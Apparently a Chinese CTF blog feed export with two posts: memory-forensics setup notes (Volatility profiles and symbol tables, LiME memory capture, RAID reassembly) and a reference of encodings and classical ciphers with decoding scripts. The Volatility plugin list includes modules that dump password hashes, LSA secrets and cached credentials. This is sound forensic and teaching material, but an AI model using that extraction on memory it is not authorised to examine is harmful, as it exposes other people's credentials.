centos7制作profile：
先安装dwarfdump（创建module.dwarf文件的依赖）
yum install -y gcc make gcc-c++ git zip elfutils-devel kernel-develyum upgrade &amp;&amp; reboot   //解决kernel-devel版本与系统版本不一致的问题wget https://www.prevanders.net/libdwarf-20201201.tar.gz --no-check-certificatetar -zxvf libdwarf-20201201.tar.gzcd libdwarf-20201201./configuremakemake installcd ../

在volatility目录中的tool/Linux运行make命令来创建module.dwarf文件
git clone https://github.com/volatilityfoundation/volatility.gitcd volatility/tools/linuxmakels -l

打包，将module.dwarf和system.map打包成centos7.zip，移动到分析机的volatility/volatility/plugins/overlays/linux
zip centos7.zip /boot/System.map* module.dwarf



ubuntu制作profile：
apt-get install -y dwarfdump build-essentialapt-get install -y linux-kernel-headers kernel-packageapt -y upgrade &amp;&amp; reboot //解决kernel-devel版本与系统版本不一致的问题cd volatility/tools/linuxmake -C /lib/modules/$(uname -r)/build CONFIG_DEBUG_INFO=y M=$PWD modulesdwarfdump -di ./module.o &gt; module.dwarfzip ubuntu_5.15.0-69.zip module.dwarf /boot/System.map-$(uname -r)



Volatility3Volatility3是对Volatility2的重写，基于Python3编写，消除了对profile的依赖，使用符号表（配置文件）来匹配内存示例中的操作系统版本。
符号表用于分析相关操作系统数据的内核符号表压缩包。注意：由于Linux内核易于编译且无法唯一区分它们，因此无法轻松提供详尽的Linux符号表集。官方下载地址：
wget downloads.volatilityfoundation.org/volatility3/symbols/windows.zipwget downloads.volatilityfoundation.org/volatility3/symbols/mac.zipwget downloads.volatilityfoundation.org/volatility3/symbols/linux.zip

解压后移动到volatility3/volatility/symbols/
常用插件linux命令手册
banners.Banners                                 Attempts to identify potential linux banners in an imageconfigwriter.ConfigWriter                       Runs the automagics and both prints and outputs configuration in the output directory.frameworkinfo.FrameworkInfo                     Plugin to list the various modular components of Volatilityisfinfo.IsfInfo                                 Determines information about the currently available ISF files, or a specific onelayerwriter.LayerWriter                         Runs the automagics and writes out the primary layer produced by the stacker.linux.bash.Bash                                 Recovers bash command history from memory.linux.check_afinfo.Check_afinfo                 Verifies the operation function pointers of network protocols.linux.check_creds.Check_creds                   Checks if any processes are sharing credential structureslinux.check_idt.Check_idt                       Checks if the IDT has been alteredlinux.check_modules.Check_modules               Compares module list to sysfs info, if availablelinux.check_syscall.Check_syscall               Check system call table for hooks.linux.elfs.Elfs                                 Lists all memory mapped ELF files for all processes.linux.keyboard_notifiers.Keyboard_notifiers     Parses the keyboard notifier call chainlinux.lsmod.Lsmod                               Lists loaded kernel modules.linux.lsof.Lsof                                 Lists all memory maps for all processes.linux.malfind.Malfind                           Lists process memory ranges that potentially contain injected code.linux.proc.Maps                                 Lists all memory maps for all processes.linux.pslist.PsList                             Lists the processes present in a particular linux memory image.linux.pstree.PsTree                             Plugin for listing processes in a tree based on their parent process ID.linux.tty_check.tty_check                       Checks tty devices for hooksmac.bash.Bash                                   Recovers bash command history from memory.mac.check_syscall.Check_syscall                 Check system call table for hooks.mac.check_sysctl.Check_sysctl                   Check sysctl handlers for hooks.mac.check_trap_table.Check_trap_table           Check mach trap table for hooks.mac.ifconfig.Ifconfig                           Lists loaded kernel modulesmac.kauth_listeners.Kauth_listeners             Lists kauth listeners and their statusmac.kauth_scopes.Kauth_scopes                   Lists kauth scopes and their statusmac.kevents.Kevents                             Lists event handlers registered by processesmac.list_files.List_Files                       Lists all open file descriptors for all processes.mac.lsmod.Lsmod                                 Lists loaded kernel modules.mac.lsof.Lsof                                   Lists all open file descriptors for all processes.mac.malfind.Malfind                             Lists process memory ranges that potentially contain injected code.mac.mount.Mount                                 A module containing a collection of plugins that produce data typically foundin Mac&#x27;s mount commandmac.netstat.Netstat                             Lists all network connections for all processes.mac.proc_maps.Maps                              Lists process memory ranges that potentially contain injected code.mac.psaux.Psaux                                 Recovers program command line arguments.mac.pslist.PsList                               Lists the processes present in a particular mac memory image.mac.pstree.PsTree                               Plugin for listing processes in a tree based on their parent process ID.mac.socket_filters.Socket_filters               Enumerates kernel socket filters.mac.timers.Timers                               Check for malicious kernel timers.mac.trustedbsd.Trustedbsd                       Checks for malicious trustedbsd modulesmac.vfsevents.VFSevents                         Lists processes that are filtering file system eventstimeliner.Timeliner                             Runs all relevant plugins that provide time related information and orders the results by time.windows.bigpools.BigPools                       List big page pools.windows.cachedump.Cachedump                     Dumps lsa secrets from memorywindows.callbacks.Callbacks                     Lists kernel callbacks and notification routines.windows.cmdline.CmdLine                         Lists process command line arguments.windows.dlllist.DllList                         Lists the loaded modules in a particular windows memory image.windows.driverirp.DriverIrp                     List IRPs for drivers in a particular windows memory image.windows.driverscan.DriverScan                   Scans for drivers present in a particular windows memory image.windows.dumpfiles.DumpFiles                     Dumps cached file contents from Windows memory samples.windows.envars.Envars                           Display process environment variableswindows.filescan.FileScan                       Scans for file objects present in a particular windows memory image.windows.getservicesids.GetServiceSIDs           Lists process token sids.windows.getsids.GetSIDs                         Print the SIDs owning each processwindows.handles.Handles                         Lists process open handles.windows.hashdump.Hashdump                       Dumps user hashes from memorywindows.info.Info                               Show OS &amp; kernel details of the memory sample being analyzed.windows.lsadump.Lsadump                         Dumps lsa secrets from memorywindows.malfind.Malfind                         Lists process memory ranges that potentially contain injected code.windows.memmap.Memmap                           Prints the memory mapwindows.modscan.ModScan                         Scans for modules present in a particular windows memory image.windows.modules.Modules                         Lists the loaded kernel modules.windows.mutantscan.MutantScan                   Scans for mutexes present in a particular windows memory image.windows.netscan.NetScan                         Scans for network objects present in a particular windows memory image.windows.netstat.NetStat                         Traverses network tracking structures present in a particular windows memory image.windows.poolscanner.PoolScanner                 A generic pool scanner plugin.windows.privileges.Privs                        Lists process token privilegeswindows.pslist.PsList                           Lists the processes present in a particular windows memory image.windows.psscan.PsScan                           Scans for processes present in a particular windows memory image.windows.pstree.PsTree                           Plugin for listing processes in a tree based on their parent process ID.windows.registry.certificates.Certificates      Lists the certificates in the registry&#x27;s Certificate Store.windows.registry.hivelist.HiveList              Lists the registry hives present in a particular memory image.windows.registry.hivescan.HiveScan              Scans for registry hives present in a particular windows memory image.windows.registry.printkey.PrintKey              Lists the registry keys under a hive or specific key value.windows.registry.userassist.UserAssist          Print userassist registry keys and information.windows.ssdt.SSDT                               Lists the system call table.windows.statistics.Statisticswindows.strings.Strings                         Reads output from the strings command and indicates which process(es) each string belongs to.windows.svcscan.SvcScan                         Scans for windows services.windows.symlinkscan.SymlinkScan                 Scans for links present in a particular windows memory image.windows.vadinfo.VadInfo                         Lists process memory ranges.windows.vadyarascan.VadYaraScan                 Scans all the Virtual Address Descriptor memory maps using yara.windows.verinfo.VerInfo                         Lists version information from PE files.windows.virtmap.VirtMap                         Lists virtual mapped sections.yarascan.YaraScan                               Scans kernel memory using yara rules (string or file).


Symbol Tables
文件以JSON数据的形式存储，它们可以是.json的纯JSON文件，也可以是.json.gz或.json.xz的压缩文件。Volatility会在使用时自动解压它们


Volatility3找不到windows的符号表时，会从Microsoft的Symbol Server下载关联的PDB文件，并将其转换为适当的JSON格式，并将其保存在正确的位置。而linux的符号表需要自己构造，可以通过dwarf2json将DWARF文件的内核转换为适当的JSON文件

MacOS Processing
./dwarf2json mac --macho /path/kernel.dSYM/Contents/Resources/DWARF/kernel \    --macho-symbols /path/kernel &gt; output.json

Linux Processing
./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-4.4.0-137-generic &gt; output.json


ubuntulinux系统默认有vmlinuz，但vmlinux与vmlinuz不同，需要手动安装
一：安装vmlinux（方法一：apt安装（推荐））
导入GPG keyapt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622
添加ddebs存储库
codename=$(lsb_release -c | awk  &#x27;&#123;print $2&#125;&#x27;)sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOFdeb http://ddebs.ubuntu.com/ $&#123;codename&#125;      main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates  main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverseEOF

更新软件包apt-get update
安装kernel debug symbolsapt-get install linux-image-$(uname -r)-dbgsym
包含调试信息的文件称为vmlinuxXXXdebug，其中XXX是内核版本。该文件存储在/usr/lib/debug/boot下

一：安装vmlinux（方法二：手动下载安装（不推荐））
在http://ddebs.ubuntu.com/pool/main/l/linux/找到合适的版本后下载到本地
dpkg -i安装，安装完成同样在/usr/lib/debug/boot目录下
例如：
dpkg -i linux-image-unsigned-5.15.0-60-generic-dbgsym_5.15.0-60.66_amd64.ddeb

二：导出json
./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.15.0-60-generic &gt; Ubuntu2004.json

这里要注意内存尽量大于8G，不然会报已杀死的错误

移动json文件到分析机的volatility3/volatility3/framework/symbols/linux/
python3 vol.py -vvvv isfinfo

centos一：安装vmlinux
yum install -y yum-utilsdebuginfo-install kernel

查找vmlinux文件
二：导出json
同样注意内存不要太小

内存提取
完整的内存数据包括两部分: 物理内存数据和页面交换文件数据。


物理内存通常是一个特殊的内核对象, 比如, 在Windows系统中, 物理内存是内核内存区对象, 即 \\Device\\PhysicalMemory; 在Unix/Linux系统中, 物理内存为/dev/mem和/dev/kmem。 只要能读取该内核对象, 就能获取物理内存数据.


物理机上使用工具比如Win32dd/Win64dd,Memoryze,DumpIt,FastDump。在虚拟机上，获取内存是很容易的，你可以暂停VM并取出.vmem文件。

这里采用lime制作内存镜像(windows可以用DumpIt)
以centos7为例子
yum install -y gcc make gcc-c++ git kernel-develgit clone https://github.com/504ensicsLabs/LiME.gitcd LiME/src &amp;&amp; make


如果出现以下报错
make -C /lib/modules/3.10.0-1127.el7.x86_64/build M=&quot;/root/LiME/src&quot; modulesmake: *** /lib/modules/3.10.0-1127.el7.x86_64/build: 没有那个文件或目录。 停止。make: *** [default] 错误 2

说明系统自身的内核版本和kernel-devel安装的内核不匹配
使用 uname -r 查询内核版本：3.10.0-1127.el7.x86_64使用 rpm -qa kernel-devel 查看安装的版本：kernel-devel-3.10.0-1160.88.1.el7.x86_64
解决方法：yum upgrade重新编译会生成一个名字和内核版本相同的.ko文件

使用lime工具导出内存文件
insmod ./lime-3.10.0-1160.88.1.el7.x86_64.ko &quot;path=/root/centos.line format=lime&quot;
其他类型RAID比如题目给了RAID格式的磁盘文件

方法一：使用UFS重组
UFS Explorer Professional Recovery 9.18

方法二：用losetup和mdadm进行组装挂载
apt install mdadm# 挂载losetup -fP m8X4exzG.imglosetup -fP Fsiq6lKn.imglosetup -fP gSoNiXLC.imglosetup -fP suPVGqm6.imglosetup -fP uGZ85OzT.img# 查看结果cat /proc/mdstatdf


如果没有图形化界面，可以通过mount挂载一下如果没有自动识别组成raid，则需要使用mdadm手动组装
参考文章：内存取证(总结篇)最近遇到的Linux内核内存取证小分析
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>总结</tag>
        <tag>内存取证</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(编码密码篇)</title>
    <url>/posts/86a2c34b/</url>
    <content><![CDATA[
推荐使用https://www.dcode.fr/和CyberChef

常见编码&#x2F;加密1.1. ASCII编码ASCII码大致可以分作三部分组成。
第一部分是：ASCII非打印控制字符。ASCII表上的数字0–31分配给了控制字符，用于控制像打印机等一些外围设备。
第二部分是：ASCII打印字符。数字 32–126 分配给了能在键盘上找到的字符，数字127代表 DELETE 命令。
第三部分是：扩展ASCII打印字符。扩展的ASCII字符满足了对更多字符的需求。扩展的ASCII包含ASCII中已有的128个字符（数字0–32显示在下图中），又增加了128个字符，总共是256个。


1.2. Base家族base64 编码是用64（2^6）个字符，对二进制数据进行编码的方式base32 就是用32（2^5）个字符，对二进制数据进行编码的方式base16 就是用16（2^4）个字符，对二进制数据进行编码的方式
这里我们可以清楚的看到，base系列编码之间的不同，在于用于编码的字符数量的多少具体参考wiki百科
1.2.1. base16码表0123456789ABCDEF
Base16使用两个ASCII字符去编码原数据中的一个字节数据，所以Base16不可能用到填充符号=
1.2.2. base32码表ABCDEFGHIJKLMNOPQRSTUVWXYZ234567
另有=符号作为填充
1.2.3. base58码表123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
相比 Base_64，Base_58 不使用数字 “0”，字母大写”O”，字母大写 “I”，和字母小写 “l”，以及 “+” 和 “&#x2F;“ 符号，比Base64共减少6个字符，故称着Base58
1.2.4. base62码表ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
Base62使用了62个字符编码，包括0-9，a-z，A-Z。
1.2.5. base64码表ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
另有=符号作为填充
1.2.6. base91码表
Base91编码是从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建Base91编码表：-（破折号，0x2D）\（反斜杠，0x5C）’（撇号，0x27）
1.3. Quoted-printable 编码Quoted-printable或QP encoding，没有规范的中文译名，可译为可打印字符引用编码或使用可打印字符的编码。Quoted-printable是使用可打印的ASCII字符（如字母、数字与“&#x3D;”）表示各种编码格式下的字符，以便能在7-bit数据通路上传输8-bit数据, 或者更一般地说在非8-bit clean媒体上正确处理数据。这被定义为MIME content transfer encoding，用于e-mail。
例子：
=E4=BB=8A=E5=B9=B4=E5=85=83=E5=A4=9C=E6=97=B6=EF=BC=8C=E6=9C=88=E4=B8=8E=E7=81=AF=E4=BE=9D=E6=97=A7=E3=80=82

特点：由=，大写字母A–F和数字0-9组成，不加密英文和数字
解码：CyberChef可解
1.4. XXencode编码表：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。
例子：
hK3VZPaBjN4KxewfYmCjCl94yohH1jwXxiDPLpfrOneepdQuvjTXEo95UkiiVhcwXbiTjLvffnmeDDkfL2pwf-nwbNoxf6zPXqpxOxqeCggfitivL2gfyrrRD1hkSCmiQPfcODJsgXxiDPLpfrOiP9Ho16oiDN0OLGXfB9IBa7dRAuehOLCivTKhnecoiDPLuOCgkvysxhTdohH8ffrspgP+h95hmfv9yPDqnxOplAfxpfLKivjVdkiHIqX0pjHMnpeuwt84XohH9yPPIouPKhPL2nfjKkxTKhzioygnacOA+

特点：第一位通常表示这一行密文是由多少个字符加密得到的，比如cat加密后是1Mq3o，1在表中的索引值是3，所以可以看做原文由三位字符组成。并且每行最多只能加密45个字符，然后换行，可以参考上面的例子
在线加解密
1.5. UUencode编码表：ASCII字符集中可打印字符(32-96)
UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。
例子：
M555E;F-O9&amp;7*Q]*[UM:V_KWXUL:UO&lt;[$U]:UQ+&#x27;@PNNCK-?NU.?4VG5N:7@@MT\J\_L^US;/6T,JYT\.CK,BKL\:CNE5N:7@M=&amp;\M56YI&gt;&quot;!E;F-O9&amp;EN9Z.LM555E;F-O9&amp;6]J\KDR.O.Q+&amp;^TM3#O\C]N/;7UKW:SJJUI&lt;Z[O?C0T+&#x27;@PNNCMK,CGN?O7[KKSRJ//PK7$U\K!S\G9T]K(_;CVU]:]VJ.LLKNYN[7$LK^WW=/#MP&gt;.RN&lt;;KH:/(_;CVU]:]VKFRT]`R-+CV0FETHZS2U#8M8FETSJJUI&lt;Z[M];.MJC2X]M?IHZS#O[CVU^G2U,JNO?C6QL&quot;TL&gt;W*OLOYL_;/UK7$U]:]VK7$ROW6MM:&amp;CU&gt;*X]LK]UK76N[OAPN34VC&quot;UO38SUJZ\Y*&amp;CR+NZ\[VKP[^X]LK]O-/)MSS,RHZS+^;+ZR?JUQ+WAN?NXU;K#PN34VD%30TE)U]:W^[ROUM&quot;_R;3RTZ&#x27;7CUK?[HZ@S,BV_U;#7H:TY-2VUU\_?HZFUQ+&gt;VSJ?6KM;0H:,`


特点：与XXencode相似，第一位表示这一行密文是由多少个字符加密得到的。
在线加解密
1.6. 敲击码基于5×5方格波利比奥斯方阵来实现

例子：
code..... ../... ./... ./... ../52 31 31 32

原文：wllm
特点：不超过五个点，两个一组，使用斜杠分隔每组
1.7. 莫尔斯电码摩尔斯电码主要由以下5种它的代码组成：1：点（.）2：划（-）3：每个字符间短的停顿（通常用空格表示停顿）4：每个词之间中等的停顿（通常用 &#x2F; 划分）5：以及句子之间长的停顿
表
A  .-    N  -.    .  .-.-.-  +  .-.-.    1  .----B  -...  O  ---   ,  --..--  _  ..--.-   2  ..---C  -.-.  P  .--.  :  ---...  $  ...-..-  3  ...--D  -..   Q  --.-  &quot;  .-..-.  &amp;  .-...    4  ....-E  .     R  .-.   &#x27;  .----.  /  -..-.    5  .....F  ..-.  S  ...   !  -.-.--              6  -....G  --.   T  -     ?  ..--..              7  --...H  ....  U  ..-   @  .--.-.              8  ---..I  ..    V  ...-  -  -....-              9  ----.J  .---  W  .--   ;  -.-.-.              0  -----K  -.-   X  -..-  (  -.--.L  .-..  Y  -.--  )  -.--.-M  --    Z  --..  =  -...-

例子：.../---/...
原文：SOS
解码：CyberChef可解
1.8. 社会主义核心价值观编码github上的加解密js代码
import &quot;babel-polyfill&quot;;&#123;    function assert(...express)&#123;        const l = express.length;        const msg = (typeof express[l-1] === &#x27;string&#x27;)? express[l-1]: &#x27;Assert Error&#x27;;        for(let b of express)&#123;            if(!b)&#123;                throw new Error(msg);            &#125;        &#125;    &#125;    function randBin()&#123;        return Math.random() &gt;= 0.5;    &#125;    const values = &#x27;富强民主文明和谐自由平等公正法治爱国敬业诚信友善&#x27;;    function str2utf8(str)&#123;        // return in hex        const notEncoded = /[A-Za-z0-9\-\_\.\!\~\*\&#x27;\(\)]/g;        const str1 = str.replace(notEncoded, c=&gt;c.codePointAt(0).toString(16));        let str2 = encodeURIComponent(str1);        const concated = str2.replace(/%/g, &#x27;&#x27;).toUpperCase();        return concated;    &#125;    function utf82str(utfs)&#123;        assert(typeof utfs === &#x27;string&#x27;, &#x27;utfs Error&#x27;);        const l = utfs.length;        assert((l &amp; 1) === 0);        const splited = [];        for(let i = 0; i &lt; l; i++)&#123;            if((i &amp; 1) === 0)&#123;                splited.push(&#x27;%&#x27;);            &#125;            splited.push(utfs[i]);        &#125;        return decodeURIComponent(splited.join(&#x27;&#x27;));    &#125;    function hex2duo(hexs)&#123;        // duodecimal in array of number        // &#x27;0&#x27;.. &#x27;9&#x27; -&gt; 0.. 9        // &#x27;A&#x27;.. &#x27;F&#x27; -&gt; 10, c - 10    a2fFlag = 10        //          or 11, c - 6      a2fFlag = 11        assert(typeof hexs === &#x27;string&#x27;)        const duo = [];        for(let c of hexs)&#123;            const n = Number.parseInt(c, 16);            if(n &lt; 10)&#123;                duo.push(n);            &#125;else&#123;                if(randBin())&#123;                    duo.push(10);                    duo.push(n - 10);                &#125;else&#123;                    duo.push(11);                    duo.push(n - 6);                &#125;            &#125;        &#125;        return duo;    &#125;    function duo2hex(duo)&#123;        assert(duo instanceof Array);        const hex = [];        const l = duo.length;        let i = 0;        while(i &lt; l)&#123;            if(duo[i] &lt; 10)&#123;                hex.push(duo[i]);            &#125;else&#123;                if(duo[i] === 10)&#123;                    i++;                    hex.push(duo[i] + 10);                &#125;else&#123;                    i++;                    hex.push(duo[i] + 6);                &#125;            &#125;            i++;        &#125;        return hex.map(v=&gt;v.toString(16).toUpperCase()).join(&#x27;&#x27;);    &#125;    function duo2values(duo)&#123;        return duo.map(d=&gt;values[2*d]+values[2*d+1]).join(&#x27;&#x27;);    &#125;    function valuesDecode(encoded)&#123;        const duo = [];        for(let c of encoded)&#123;            const i = values.indexOf(c);            if(i === -1)&#123;                continue;            &#125;else if(i &amp; 1)&#123;                continue;            &#125;else&#123;                // i is even                duo.push(i &gt;&gt; 1);            &#125;        &#125;        const hexs = duo2hex(duo);        assert((hexs.length &amp; 1) === 0);        let str;        try&#123;            str = utf82str(hexs);        &#125;catch(e)&#123;            throw e;        &#125;        return str;    &#125;    function valuesEncode(str)&#123;        return duo2values(hex2duo(str2utf8(str)));    &#125;    // ------------------    const decodedArea = document.getElementById(&#x27;decoded-area&#x27;);    const encodedArea = document.getElementById(&#x27;encoded-area&#x27;);    const decodeBtn = document.getElementById(&#x27;decode-btn&#x27;);    const encodeBtn = document.getElementById(&#x27;encode-btn&#x27;);    encodeBtn.addEventListener(&#x27;click&#x27;, e=&gt;&#123;        encodedArea.value = &#x27;&#x27;;        const encoded = valuesEncode(decodedArea.value);        encodedArea.value = encoded;    &#125;);    decodeBtn.addEventListener(&#x27;click&#x27;, e=&gt;&#123;        decodedArea.value = &#x27;&#x27;;        const decoded = valuesDecode(encodedArea.value);        decodedArea.value = decoded;    &#125;);&#125;;

分析后不难发现有以下几点结论：
1：表是富强 民主 文明 和谐 自由 平等 公正 法治 爱国 敬业 诚信 友善，索引值0-11
2：字符串hex值中的0-9 对应 表索引值的0-9。比如十六进制的0，在表中是富强
3：字符串hex值中的A-F 对应 表索引值的关系有两种
A -&gt; 10 0B -&gt; 10 1C -&gt; 10 2D -&gt; 10 3E -&gt; 10 4F -&gt; 10 5A -&gt; 11 4B -&gt; 11 5C -&gt; 11 6D -&gt; 11 7E -&gt; 11 8F -&gt; 11 9



解释一下上面的结论，以我Kc !6为例子加密后的几种结果为诚信自由公正爱国爱国敬业民主自由诚信民主公正和谐文明富强文明民主和谐公正诚信自由公正爱国爱国敬业民主自由友善平等公正和谐文明富强文明民主和谐公正友善爱国公正爱国爱国敬业民主自由诚信民主公正和谐文明富强文明民主和谐公正友善爱国公正爱国爱国敬业民主自由友善平等公正和谐文明富强文明民主和谐公正
先将我Kc !6以十六进制编码的形式表示E6 88 91 4B 63 20 21 36
E在表中是10 4或者11 8，然后拿10 4和11 8在索引表中找到诚信 自由或者友善 爱国，再接着是6，在表中是公正，后面的以此类推。
1.9. jjencode&#x2F;aaencodejjencode代码，就是将正常的js代码转换成复杂的只有符号的字符串编码，进行加密 如：[$._$_]+$._$+&quot;,\\&quot;+$.$__+$.___+&quot;\\&quot;+$.__$+$.__$+$这样的组合
jjencode加密&#x2F;解密
aaencode代码，则是将正常的js代码转为好玩的特殊网络表情符号。如:ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ)这样的表情文字
AAEncode加密&#x2F;解密
1.10. 埃特巴什码(Atbash)就是倒着来
常文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A
例子
WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;DASCTF&#123;5e0f98a95f79829b7a484a54066cb08f&#125;

CyberChef可解
1.11. 金笛短信PDU编码需要一行一行地解码
例子
0001000D91683106019196F40008720038003900350030003400450034003700300044003000410031004100300041003000300030003000300030003000440034003900340038003400340035003200300030003000300030003000340037003000300030003000300030003000380030003800300032003000300030003000300001000D91683106019196F40008720030003200340044004300370035004600310030003000300030003000300042004300340039003400340034003100350034003700380035004500440044003900320034003100310032003800350033003000300038003400330042003900310039004600370033004600310035003900460001000D91683106019196F4000870003800340046004100380037003100320031003700360045003700340035003100320036004500330044003400410036003200440037003900350035004200330038003800320031003100370039003900420042003200450041004200390035004100360042003300420042004500370001000D91683106019196F400086E00420036003000390039003300450045003600330046003200360046004400440031004200430044004100420033003000330033003100460045003500450036004400390033003700350042003000360035003600360041003200310030004100330041004200370031004400380001000D91683106019196F4000870004500330044003700320031003000310044004200340039003100360039003600380030003100330032003400460038004500460032003800340045004200330035004300300046004200360034004500460031003000300041003100420041003000430032003000440044004500420001000D91683106019196F400086E00380034004100320042004400380042003500380042003300390045004100430036004500300041004200310030003800440036004400360046003400340043004600440038003100440030003300420036003900340042004300390034004300320033003100330044003400460001000D91683106019196F4000870003600380039003900310036004400360032003600410037003900350038004600350043004400390035003900420045003200380043003400340033004100450037003600430031003000350038003800300032003800350039003200390036003100420046004300440034003000440001000D91683106019196F40008720031003500370046003100330034003100330038003900430046004100420036004100450035004600320033003000380037003700350045003800310045004200320030003300300043003000350030003400370035003100440039004600410034004500450046003200320046004400300001000D91683106019196F400085200300037004400450044003500420036003800410033003100350046004400310031003000300030003000300030003000300034003900340035003400450034003400410045003400320036003000380032

金笛短信PDU编码解码工具
1.12. Twitter Secret Messages例子：
i hａd a grｅａｔ dａｙ at the beach! #sunshine                

特点：密文中有很多Unicode字符
在线网站解密
1.13. 中文电码中文电码表采用了四位阿拉伯数字作代号，从0001到9999按四位数顺序排列，用四位数字表示最多一万个汉字、字母和符号。汉字先按部首，后按笔划排列。字母和符号放到电码表的最尾。
例子：
中：0022文：2429电：7193码：4316

特点：四个数字一组
在线查询中文电码
1.14. 凯撒密码凯撒密码是一种替换加密技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。
凯撒(Caesar)加密&#x2F;解密
1.15. VBS加密enc.vbe内容如下
#@~^HAAAAA==W^lLyPb/P@#@&amp;4*.2&#123;W!!x[mFC&amp;|0AcAAA==^#~@

VBScript encrypter and decrypter
1.16. 盲文
布莱尔创造的由6个点为基础结构的盲字，在纸面上有的凸起，有的不凸起，形成64种变化，即64种符形，在每个符号（单位称”方”）左右两列，每列各三个点，从左边自上而下叫做1、2、3点，从右边自上而下叫做4、5、6点。

英语字母盲文表如下

数字盲文表如下

在线翻译
1.17. ookOok! 与Brainfuck类似, 但用单词”Ook”，”Ook.” 和 “Ook?”代替。
在线网站1在线网站2
1.18. 棋盘密码(Polybius,ADFGX,ADFGVX)波利比奥斯方阵密码
例如“hello”用棋盘密码加密后变成“2315313134”。实际应用中，方阵中的字母顺序会被打乱，然后分发给信息发送方和接收方，增加第三方破解难度。
特点：明文只能是字母；密文全部为数字；密文长度是明文的两倍，即偶数；明文字母I和J的密文编码相同，解密后需人工确认。


第一次世界大战中德军发明了ADFGX棋盘密码，它是Polybius棋盘密码的改良版本，以适应当时的电报信息加密传送。ADFGX密码将Polybius棋盘中的12345替换成ADFGX，因此密文由数字变成了字母。然后使用一个密钥将密文再次移位加密，得到最终密文。


它是ADFGX棋盘的加强版本，增加了一个行列，用V表示。如此形成6行6列的棋盘，容纳26个字母、10个数字，总计36个字符。加密强度更高，且解密时不再刻意区分I和J
这个密码以使用于密文当中的六个字母A、D、F、G、V、X命名

解密脚本
def adfgvx_plus_decode(cp: str, kw: str, km: str) -&gt; str:    &quot;&quot;&quot;        cp:cipher     密文        kw:keyword    密码        km:keymap     键盘布局    &quot;&quot;&quot;    keyword = kw.lower()    cipher = cp.lower()    klen = len(keyword)    clen = len(cipher) // klen    ncol = len(cipher) % klen    #print(len(cipher),klen,clen,ncol)    cols = [&#x27;&#x27;] * klen    i = j = k = 0    while i &lt; klen:        try:  # js: string.charAt(j)            c = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;[j]        except:            c = &#x27;&#x27;        t = keyword.find(c)  # js: string.indexOf(c)        if t &gt;= 0:            col = clen + (1 if t &lt; ncol else 0)            cols[t] = cipher[k:k + col]            k += col            atmp = list(keyword)            atmp[t] = &#x27;_&#x27;            keyword = &#x27;&#x27;.join(atmp)            i += 1        else:            j += 1        #print(i,j,k,t,cols,keyword)    s = &#x27;&#x27;    for i in range(clen + 1):        for j in range(klen):            try:  # js: string.charAt(j)                s += cols[j][i]            except:                pass            #print(s)    a = &#x27;adfgvx&#x27;    return &#x27;&#x27;.join([km[a.find(s[i]) * 6 + a.find(s[i + 1])] for i in range(0, len(s), 2)])s = [[&#x27;P&#x27;, &#x27;H&#x27;, &#x27;0&#x27;, &#x27;Q&#x27;, &#x27;G&#x27;, &#x27;6&#x27;],     [&#x27;4&#x27;, &#x27;M&#x27;, &#x27;E&#x27;, &#x27;A&#x27;, &#x27;1&#x27;, &#x27;Y&#x27;],     [&#x27;L&#x27;, &#x27;2&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;F&#x27;, &#x27;D&#x27;],     [&#x27;X&#x27;, &#x27;K&#x27;, &#x27;R&#x27;, &#x27;3&#x27;, &#x27;C&#x27;, &#x27;V&#x27;],     [&#x27;S&#x27;, &#x27;5&#x27;, &#x27;Z&#x27;, &#x27;W&#x27;, &#x27;7&#x27;, &#x27;B&#x27;],     [&#x27;J&#x27;, &#x27;9&#x27;, &#x27;U&#x27;, &#x27;T&#x27;, &#x27;I&#x27;, &#x27;8&#x27;]]keymap = &#x27;&#x27;.join([s[i][j] for i in range(6) for j in range(6)])keyword = &#x27;Yusayyds&#x27;cipher = &#x27;AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV&#x27;flag = adfgvx_plus_decode(cipher, keyword, keymap)for i in range(0, len(flag), 2):    print(chr(int(flag[i:i + 2], 16)), end=&#x27;&#x27;)



